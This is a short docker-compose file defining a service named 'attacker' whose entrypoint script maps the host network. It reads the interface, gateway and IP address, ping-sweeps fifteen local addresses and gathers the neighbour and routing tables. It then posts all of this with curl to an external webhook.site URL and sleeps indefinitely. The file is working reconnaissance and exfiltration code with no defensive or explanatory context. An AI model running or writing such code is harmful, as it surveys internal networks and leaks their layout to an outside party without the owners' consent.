services:
  attacker:
    image: alpine:3.20
    entrypoint:
      - sh
      - -c
      - |
        apk add --no-cache curl iproute2 2>/tmp/apk.log
        WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
        IF=$(ip route 2>/dev/null | awk '/default/{print $5; exit}')
        GW=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
        IP=$(ip -4 addr show "$IF" 2>/dev/null | awk '/inet /{print $2}')
        NET=$(echo "$IP" | sed 's/\.[0-9]*\/.*$//')
        for i in $(seq 1 15); do ping -c1 -W1 "${NET}.${i}" >/dev/null 2>&1 & done
        wait
        {
          echo "V4 IF=$IF GW=$GW IP=$IP NET=$NET"
          echo "=neigh="
          ip neigh 2>/dev/null
          echo "=route="
          ip route 2>/dev/null
          echo "=apk="
          tail -3 /tmp/apk.log
        } | curl -sS --max-time 15 --data-binary @- "$WH?tag=L1-V4" 2>&1
        sleep 999999
